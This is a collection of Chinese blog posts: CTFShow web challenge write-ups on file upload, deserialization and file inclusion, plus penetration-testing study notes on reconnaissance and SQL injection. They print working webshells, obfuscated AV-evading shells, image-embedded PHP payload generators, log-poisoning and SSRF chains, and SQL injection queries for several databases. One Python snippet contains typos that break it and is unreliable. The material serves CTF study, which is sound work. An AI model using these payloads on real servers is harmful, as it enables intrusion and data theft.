[{"title":"CTFShow文件上传","url":"/2022/03/30/CTFShow文件上传/","content":"\n**151**\n\n前端校验，直接绕过\n\n**152**\n\nContent/Type校验，直接绕过\n\n**153**\n\n文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 头发现中间件是nginx\n\n```\nnginx中和apache的.htacess有相同作用的文件是.user.ini，进一步拓展，php中的默认配置文件实为php.ini，而php.ini有四种配置模式\n\nPHP_INI_USER\t\t\t可以在user.ini中设定\nPHP_INI_PERDIR\t\t可以在php.ini,.htacess,httpd.conf中设定\nPHP_INI_SYSTEM\t\t可以在php.ini,httpd.conf中设定\nPHP_INI_ALL\t\t\t\t随意设定\n\n并且除了php.ini文件之外，php还会从当前目录到web根目录下逐级搜索ini文件，并且在世纪操作中除了PHP_INI_SYSTEM中的内容都可以通过.user.ini进行设定\n\n那么user.ini中实际有用的配置项有两个：\nauto_append_file \t//在php4.2.3及以前是PHP_INI_ALL里面的，后面变成了PHP_INI_PERDID\nauto_prepend_file\n这两项的功能是制定一个文件包含在要执行的文件之后/之前，类似帮助原始文件添加一个require(某文件)\n```\n\n所以最终我们需要的就是将木马上传后再上传.user.ini设置包含木马即可\n\n```\n//.user.ini\nauto_prepend_file = shell.png\n//shell.png\n@eval($_POST['kkk']);\n```\n\n**154**\n\n同上题，过滤了php，大小写绕过\n\n**155**\n\n严格过滤php，所以大小写过不去了，短标签绕过\n\n```PHP\n当php参数:short_open_tag = On时，php可以解析短标签内容\nphp中常见的四种标签的写法：\n<?php echo \"CTF\"; ?>\n<? echo \"CTF\"; ?>\t\t//short_open_tag = On\n<% echo \"CTF\"; %>\t\t//这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。 \n<script language=”php”> echo \"CTF\"; </script>\n\n还有一种神奇写法以后会用到\n<?=(表达式)?>  等价于 <?php echo (表达式)?> //无限制  \n```\n\n**156**\n\n过滤了`[  ]`，可用`{  }`代替\n\n**157**\n\n过滤了分号和花括号，用上面的神奇写法直接执行`<?=(system('tac ../flag.???'))?>` \n\n**158**\n\n同上\n\n**159**\n\nsystem貌似没了，用`<?=nl ``../fl*``?>`\n\n**160**\n\n反引号都没了，只能尝试包含访问日志了\n\n```\n//shell.png\n<?include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n//空格都没给留就离谱\n//User-Agent\n<?php eval($_POST[1]);?>\n```\n\n**161**\n\n增加了对文件头的检测，其余同上\n\n**162**\n\n.和flag被过滤，session文件的竞争包含，隔壁文件包含有原因\n\n```php+HTML\n//.user.ini\nauto_prepend_file=/tmp/sess_kkk\n//1\n<?=include\"/tmp/sess_kkk\"?>\n//POC.html\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"链接\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n\n```\n\n**163**\n\n同上\n\n**164**\n\npng图片二次渲染\n\n```\n在php中包含需要渲染的代码时\n```\n\n直接用大佬脚本生成一张图片咯\n\n```PHP\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'kkk.png');  //要修改的图片的路径\n/*\n木马内容\n<?$_GET[0]($_POST[1]);?>\n*/\n?>\n```\n\n**165**\n\njpg图片二次渲染\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n用法  php exp.php a.png\n```\n\n**166**\n\nx-zip-compressed\n\n**167**\n\n提示中为httpd，肯定与apache有关，尝试解析漏洞，上传shell.php.xxx发现执行失败，尝试上传.htaccess\n\n```\n<FilesMatch \"png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n或者\nAddType application/x-httpd-php .png   //将.png后缀的文件解析 成php\n```\n\nOK\n\n**168**\n\n构造免杀木马\n\n```\n<?php\n$a = \"s#y#s#t#e#m\";\n$b = explode(\"#\",$a);\n$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];\n$c($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=substr('1s',1).'ystem';\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=strrev('metsys');\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=$_REQUEST['a'];\n$b=$_REQUEST['b'];\n$a($b);\n?>\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFShow反序列化","url":"/2022/03/24/CTFshow反序列化/","content":"\n254\n\n```\npayload:?username=xxxxx&password=xxxxx\n```\n\n按照题中全等于直接构造即可\n\n255-257\n\n构造就行\n\n258\n\n过滤了`O:数字`的形式，在冒号后加+即可，URLdecode会自动解析成连接的\n\n259\n\n什么玩意跳过了\n\n```php\n//flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n//index.php\n<?php\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\n灰溜溜的回来看WP\n\n```\n如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。\n```\n\n\n\n```PHP\n//PHP中原生类\nclass SoapClient {\n    /* Methods */\n    public __construct(?string $wsdl, array $options = [])\n    public __call(string $name, array $args): mixed\n    public __doRequest(\n        string $request,\n        string $location,\n        string $action,\n        int $version,\n        bool $oneWay = false\n    ): ?string\n    public __getCookies(): array\n    public __getFunctions(): ?array\n    public __getLastRequest(): ?string\n    public __getLastRequestHeaders(): ?string\n    public __getLastResponse(): ?string\n    public __getLastResponseHeaders(): ?string\n    public __getTypes(): ?array\n    public __setCookie(string $name, ?string $value = null): void\n    public __setLocation(?string $location = null): ?string\n    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool\n    public __soapCall(\n        string $name,\n        array $args,\n        ?array $options = null,\n        SoapHeader|array|null $inputHeaders = null,\n        array &$outputHeaders = null\n    ): mixed\n}\n//可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options\n```\n\n```php\n在构造SoapClient类时，传入数组参数为：\narray('uri'=>'http://链接','location'=>'http://链接/文件','user_agent'=>'UA头')\n该类的__call方法可构造请求使其对指定URL发起POST请求\n所以构造该类代码如下\n\n\n<?php\n   $ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n   /*相当于构造出以下请求\n   User-Agent: ctfshow\n   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\n   Content-Type:application/x-www-form-urlencoded\n   Content-Length:13\n   \n   token=ctfshow\n   */\n   //由于Content-Length已经确定，所以后面该类自行构造的请求头失效\n   $s=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));\n   echo serialize($s);\n?>\n```\n\n260\n\n就输入那串字符就行\n","tags":["CTF","web"]},{"title":"PHP序列化","url":"/2022/03/22/PHP序列化/","content":"\n序列化的概念：把一个对象转为字符串\n\n序列化的好处：\n\n1、有利于数据存储\n\n2、方便数据传递\n\n序列化后字符串的格式\n\n```\nPublic属性序列化后格式：成员名\nPrivate属性序列化后格式：%00类名%00成员名\nProtect属性序列化后格式：%00*%00成员名\n```\n\nO:对象类名长度:\"对象类名\":对象属性个数{属性名类型:属性名长度:\"属性名字\";属性类型:属性长度:\"属性内容\"}\n\n```\nPHP序列化与反序列化方法：\n1、__construct 当一个对象被创建时调用\n2、__destruct 当一个对象被销毁时调用\n3、__toString 当一个对象被当作一个字符串时使用\n4、__sleep 在对象被序列化之前运行\n5、__wakeup 在对象被反序列化之后调用\n```\n\n通过一道题来尝试一下吧：[网鼎杯 2020 青龙组]AreUSerialz\n\n题目代码：\n\n```PHP\n<?php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nclass FileHandler {\n    protected $op;\n    protected $filename;\n    protected $content;\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n}\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\nif(isset($_GET{'str'})) {\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n}\n```\n\n显然，如果我们想要拿到flag中的内容就需要进行读操作，操作的文件名是flag.php，所以我们尝试在本地构造一个对应的类并且将其序列化\n\n```PHP\n<?php\n\tclass FileHandler {\n    protected $op=2;\n    protected $filename='flag.php';\n    protected $content=1;\n\t}\n\t$s=new FileHandler();\n\techo serialize($s);\n?>\n```\n\n尝试生成的字符串作为payload发现失败，原因是在这个类里面每个变量都是保护属性，在序列化时会被序列化为**%00类名%00成员名**很明显%00是我们不需要的，所以需要将本地生成类中改为public属性\n\n```PHP\n<?php\n\tclass FileHandler {\n    public $op=2;\n    public $filename='flag.php';\n    public $content=1;\n\t}\n\t$s=new FileHandler();\n\techo serialize($s);\n?>\n```\n\n获取字符串后查看源码拿到flag\n","tags":["CTF","web"]},{"title":"CTFshow文件包含","url":"/2022/03/22/CTFshow文件包含/","content":"\n##### 78\n\n```\npayload:?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n无过滤直接伪协议读取flag\n\n##### 79\n\n```\npayload:?file=data://text/plain,<?=eval($_POST['cmd']);?>\nPOST\ncmd=system('cat flag.php');\n\npayload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\n过滤了php，可使用data协议，通过再传入一个参数来执行命令，也可base64解码出想执行的命令\n\n##### 80\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了data，可通过包含日志来执行命令\n\n##### 81\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了冒号，日志包含依然可行\n\n##### 82\n\n过滤了.，只能包含无后缀文件，在PHP中唯一能控制的无后缀文件就是session文件，所以尝试通过脚本竞争包含写入\n\n```\n原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在/tmp/sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中\n```\n\n##### 83\n\n上来就把session销毁了，没办法使用竞争包含\n","tags":["CTF","web"]},{"title":"小迪","url":"/2022/03/08/小迪/","content":"\n# 信息收集\n\n## Day 7 CDN绕过\n\n判断某网站是否使用CDN服务：使用多节点访问，查看返回IP是否相同\n\n#### CDN绕过：\n\n1、子域名查询：xxx.原始域名\n\n子域名查询：https://tool.chinaz.com/subdomain/\n\n2、邮件服务查询：使用邮件服务时大部分不会使用CDN，尝试收取来自该域名的邮件并查看原始邮件标头\n\n3、国外地址请求：针对国内网站，大部分不会开设国外CDN\n\n4、遗留文件，扫描全网：例如phpinfo，探针等，扫描全网使用\n\n5、黑暗搜索引擎搜索特定文件：Shodan，zoomeye，fofa\n\n搜哈希：以网页favicon.ico为例\n\n```python\nimport mmh3\nimport requests\n\nre=requesets.get('地址')\nfav=re.content.encode('base64')\nhas=mh3.hash(fav)\nprint 'http.favicon.hash:'+str(hash)\n```\n\n获得结果后到黑暗引擎中搜索特定内容\n\n6、DNS历史记录\n\n7、~~DDOS打爆~~\n\n8、第三方接口：get-site-ip.com，threatbook.cn\n\n<!--more-->\n\n## DAY 8 架构 搭建 WAF\n\n流程：首先查看是否能获得源码，如果是开源项目可直接去的源码\n\n而后查看服务器的操作系统，搭建平台，数据库类型\n\n进而查看各种站点\n\n最后绕过WAF\n\n攻击目标是否有APP：有的话首先查看是否通过web协议通信，是的话抓取数据包，没有\n\n{% pullquote mindmap mindmap-md %}\n- 信息搜集\n    - 有无web端\n        - 有CDN\n            - 找出真实服务器IP后攻击\n        - 无CDN\n            - 程序源码\n                - 未知CMS\n                - 开源CMS\n        - 服务器信息\n            - 操作系统\n            - 搭建平台\n            - 数据库类型\n        - 站点搭建\n            - 目录站点（从下往上打，只要打通整个根目录下所有站点全部被攻击）\n            - 端口站点\n            - 子域名站点\n            - 旁注站点——同服务器不同站点\n            - C端站点——同网段下不同服务器不同站点\n            - 类似域名站点等\n        - 防护应用WAF——通过脚本嗅探特征\n            - 大部分响应头有X-Powered-By: WAF\n            - 安全狗\n            - 宝塔\n            - 云盾\n            - 安骑士\n    - 有无APP\n        - 走web协议\n            - 抓取数据包走web攻击\n        - 非web协议\n            - 尝试提取\n            - 反编译逆向\n    - 有无其他\n        - 资产信息\n            - 以上各种平台信息\n            - whois备案\n            - github等监控\n        - 第三方应用\n            - 数据库应用\n                - mysql\n                - mssql\n                - oracle\n            - 管理平台\n                - weblogic\n                - phpmyadmin\n            - 第三方应用\n                - vsftpd\n                - nexus\n                - git\n        - 各种服务接口\n            - 存储服务\n            - 支付服务\n            - 内部服务\n        - 微信公众号等位置找到更多的应用\n            - 涉及web\n            - 涉及APP\n            - 涉及其他\n        - 内部群或内部应用等（社工）\n            - QQ或微信群\n            - 工作群\n            - 其他群聊\n\n{% endpullquote %}\n\n## DAY 10 其他资产监控\n\nGitHub监控：便于收集整理最新exp或poc，发现相关测试目标的资产\n\n域名搜集：枚举爆破，利用漏洞，主站爬取，whois查询\n\n\n\n# WEB漏洞\n\n## DAY 11 web漏洞 基础\n\nWEB漏洞类型\n\n{% pullquote mindmap mindmap-md %}\n\n- WEB漏洞\n  - 常见\n    - SQL注入\n      - 危害：获取到隐秘数据，获取管理员账号密码等\n    - 文件上传\n    - XSS跨站\n    - 文件包含\n    - 反序列化\n    - 代码执行\n    - 逻辑安全\n    - 未授权访问\n  - 不常见\n    - CSRF\n    - SSRF\n    - 目录遍历\n      - 产生原因：为方便将需要访问的文件定义成变量，未对传入的文件目录进行过滤，导致某些文件被读取\n      - 危害：服务器中的隐私文件被读取\n      - 攻击方式：扫，往死里扫\n    - 文件读取\n    - 文件下载\n    - 命令执行\n    - XXE安全\n    - 其他\n\n{% endpullquote %}\n\n\n\n## DAY 12，13 web漏洞 SQL注入 简要注入 MySQL注入\n\n**数据库注入基本流程**\n\n首先明确数据库的类型和权限\n\n然后明确提交的方法和参数类型等\n\n注入成功后首先明确数据库记录信息的系统表\n\n然后依次对进行库表列数据进行注入查询\n\n最终目的找到网站后台并登陆尝试获取shell\n\n如果权限较高可通过文件读写，命令执行和注册表读取来getshell\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入\n  - 数据库类型\n    - Access\n    - Mysql\n    - Mssql\n    - Oracle\n    - Postsql\n    - SQLite\n    - Mongodb\n    - 其他\n  - 回显/盲注\n    - 回显注入\n    - 无回显注入\n    - 延时盲注\n    - 布尔盲注\n  - 提交方法\n    - GET\n    - POST\n    - COOKIE\n    - REQUEST\n    - HTTP头\n  - 数据类型\n    - 数字型\n    - 字符型\n    - 搜索型\n  - 查询方式\n    - select\n    - insert\n    - delete\n    - update\n    - order by\n  - 注入拓展\n    - 加解密注入\n    - JSON注入\n    - LADP注入\n    - DNSlog注入\n    - 二次注入\n    - 堆叠查询\n  - WAF绕过\n    - 更改提交方法\n    - 大小写混合\n    - 解密编码类\n    - 注释符混用\n    - 等价函数替换\n    - 特殊符号混用\n    - 借助数据库特性\n    - HTTP参数污染\n    - 垃圾数据溢出\n  - 防御方案\n    - 代码加载过滤\n    - WAF产品部署\n\n{% endpullquote %}\n\n\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入流程\n  - 信息收集\n    - 操作系统\n    - 数据库名\n    - 数据库用户\n    - 数据库版本\n    - 其他(网站路径等)\n  - 数据注入:同数据库\n    - 低版本：使用暴力查询或者结合读取查询(MySQL 5.0以下)\n    - 高版本：使用information_schema有据查询(MySQL 5.0以上)\n  - 高权限注入\n    - 常规查询\n    - 跨库查询\n    - 文件读写\n\n{% endpullquote %}\n\nMYSQL数据库\n\n- 网站A---->数据库A\n  - 表A\n    - 列A\n      - 列A数据\n    - 列B\n      - 列B数据\n  - 表B......\n- 网站B---->数据库B......\n\n###### MySQL数据库注入\n\nMySQL 5.0以上自带一个information_schema表记录了所有数据库名,表名,列名的数据库,相当于可以通过它获取指定数据库下面的表名和列名信息\n\ntips:数据库中的“.”符号表示下一级,如user.member就是user库下的menber表\n\ninformation_schema.tables\t记录所有表名信息\n\ninformation_schema.columns\t记录所有列名信息\n\ntable_name\t表名\n\ncolumn_name\t列名\n\n1. **测试是否存在SQL注入**\n\n```\nSELECT * FORM users WHERE id=1 and 1=1 LIMIT 0,1 \n回显正常\nSELECT * FORM users WHERE id=1 and 1=2 LIMIT 0,1\n回显错误\n```\n\n2. **猜测字段数**\n\n```\norder by\t\t\t\t\t\t测试字段数量\nunion select 1,2,3\t判断回显位置\n```\n\n3. **信息收集**\n\n```\n数据库版本:version()\n数据库名:database()\n数据库用户:user()\n操作系统:@@version_compile_os\n```\n\n4. **查询指定数据库下表名,列名,任意数据**\n\n查表名\n\n```\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n```\n\n查列名\n\n```\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name=\"刚刚查出的表名\" and table_schema=\"数据库名\"\n```\n\n查数据\n\n```\nunion select 1,2,group_concat(想查询的列) from 数据库名.表名\n```\n\n**文件读写操作**\n\n目的：getshell\n\n```\nselect load_file('文件位置')\t读取文件\nselect 'X' into outfile 文件位置\n```\n\nmysql 新版本下**secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。**在这个参数之外的位置读取文件会返回NULL\n\n一个load_file小提示：https://blog.csdn.net/weixin_30292843/article/details/99381669\n\n**文件路径的常见获取方法**：\n\n报错显示：通过输入错误内容导致函数执行出错，报错显示出文件路径\n\n遗留文件：phpinfo等\n\n漏洞报错：各种框架的问题\n\n平台配置文件：如apache，nginx，IIS等中间件\n\n爆破等\n\n###### 防注入：\n\n**自带防御：PHP中的魔术引号开关和addslashes()函数**\n\n`magic_quotes_gpc`开关被打开时`（magic_quotes_gpc=ON）`或输入内容被`addslashes`函数处理后时输入数据中含有单引号，双引号，反斜杠与NULL字符，都会被自动加上反斜杠，阻止SQL注入\n\n解决方案：进行16进制编码，MySQL能自动将十六进制转化为字符串执行\n\n**内置函数认证**\n\n没救了\n\n**关键字验证**\n\n可尝试大小写绕过\n\n**WAF防护**\n\n找方法（见上方导图）尝试吧\n\n**SQLMAP** \n\n\n\n## DAY 14 web漏洞 SQL注入 注入类型 提交注入\n\n**提交参数类型：**\n\n数字，字符，搜索，JSON等\n\n**请求方法：**\n\nGET，POST，COOKIE，REQUEST，HTTP HEADER等\n\n**PHP内置变量**\n\n$_GET（GET传参内容）\n\n$_POST（POST传参内容）\n\n$_REUQEST（GET和POST传参内容）\n\n$_SERVER（与服务器有关内容）\n\n\n\n**SQL语句干扰符号，看情况进行闭合或注释**\n\n'，\"，%，)，}等\n\n\n\n**数字型：**无引号包裹\n\n**字符型：**有引号包裹，需要闭合\n\n\n\n## DAY15 web漏洞 SQL注入 Oracle，MongoDB等注入\n\n当注入到一个不熟悉的数据库时，可搜索对应数据库的函数来帮助我们\n\n数据库的用户权限是由连接SQL的配置文件决定的\n\n\n\n**不同数据库的结构**\n\n- **Access**（.mdb文件）\n  - 表名\n    - 列名\n      - 数据\n\n特点：不同数据库是分离的，没啥功能\n\n\n\n- **MySQL，MSSQL等**\n  - 数据库名\n    - 表名\n      - 列名\n        - 数据\n\n\n\n\n\n\n- MSSQL\n\n特点：执行系统命令、读取注册表、读文件、写文件、下载远程文件、导出数据到指定的数据库服务器（能干的事贼多）\n\n\n\n**不同数据库注入命令**\n\n- Access\n\n```\n猜测字段\norder by 3\n获取表名（字典猜）\nunion select 1,2,3 from xxxx\n如果xxxx表存在就会返回数据，没有则空\n获取列名（字典猜）\nunion select 1,xxx,3 from xxxx\n如果xxx列存在就会返回数据，没有则空\n```\n\n- MSSQL\n\n```\n判断数据库类型\nand exists (select count(*) from sysobjects) 返回正常为MSSQL\n判断数据库版本\n有回显：and 1=@@version--\n无回显：and substring((select @@version),22,4)='2008'--无回显，2008即为版本，报错说明不是\n注入点权限判断\nselect is_srvrolemember('sysadmin');  判断当前是否为sa\nselect is_srvrolemember('db_owner');  判断当前用户写文件、读文件的权限（db_owner）\nselect is_srvrolemember('public');  判断是否有public权限，可以爆破表\n```\n\n- PostgreSQL\n\n```\n猜测字段\norder by 3\n获取当前数据库\nunion select null,null,current_database()--\n用户名：user\n用户权限：current_schema()\n会话用户：session_user\n获取表名\nunion select null,string_agg(relname,','),null,null from pg_stat_user_tables\n获取列名\nunion select null,string_agg(column_name,','),null,null from information_schema.columns\n获取数据\nunion select null,string_agg(xxxxx,','),null,null from 表名\n```\n\n- Oracle\n\n```\n猜测字段\norder by 3\n判断字段类型\nunion select null,null,'null' from dual 如果回显正常则说明3位置是数字型，反之则为字符型\n确定回显位置\nunion select 1,2,'3' from dual 假设1,2为数字，3为字符\n获取表名\nunion select 1,(select table_name from user_tables where rownum=1) from dual\nunion select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual 以此类推爆出所有表名\n\n获取列名\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）') from dual\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）' and culumn_name not in ('第一个字段')) from dual 以此类推爆出所有表名\n获取数据\nunion select 1,字段1||字段2||字段3...||字段n from 表名 where rownum=1 -- 在Oracle中group_concat只能联俩\n\n```\n\n- MangoDB：用NoSQLAttack打 \n\n```\n$ne关键字，意味不等于\nMangoDB进行操作时应当先将前面的对象闭合'});return ({\n获取当前数据库\ntitle:tojson(db),xxx:'1\ndb.getCollectionNames()函数获取到的是数组，需要用tojson函数转化为字符串 \n获取所有集合（表）\ntitle:tojson(db.getCollectionNames()),xxx:'1\n获取所有字段\ndb.Authority_confidential为当前使用的表\nfind函数用于查询，[0]为第一条数据\ntitle:tojson(db.Authority_confidential.find()[0])\n```\n\n**SQLMAP，NoSQLAttack，Pangolin**\n\n\n\n\n\n\n\n## DAY16 web漏洞 SQL注入 查询方式 报错盲注\n\n**数据库的查询方式**\n\n```\nselect 查询数据（最常见的）\n在网站中进行数据显示查询的操作\n例：select * from users where id=$id\n\ninsert 插入数据\n在网站中进行用户注册添加等操作\n例：insert into users(id,name,password) values(1,'Jlan','pass')\n\ndelete 删除数据\n后台管理中删除的操作\n例：delete from users where id=$id\n\nupdate 更新数据\n后台管理数据同步或缓存等操作\n例：update user set password='newpass' where id=1 and name='Jlan'\n\norder by 排序数据\n一般结合表名或列名进行数据排序操作\n例： select * from users order by $id\n\n可以通过以上查询方式与网站应用的关系\n通过注入点产生的地方或应用猜到对方的SQL查询方式\n\n```\n\n**盲注**\n\n**内容：**盲注就是在注入过程中，获取的数据不能回显至前端页面，此时我们需要利用一些方法进行判断或尝试，这个过程称为盲注\n\n**分类：**布尔盲注（逻辑判断），时间盲注（延时判断），报错盲注（报错回显）\n\n**常用函数：**\n\nlike 'xxx%'\t判断xxx或xxx...是否成立\n\nregexp 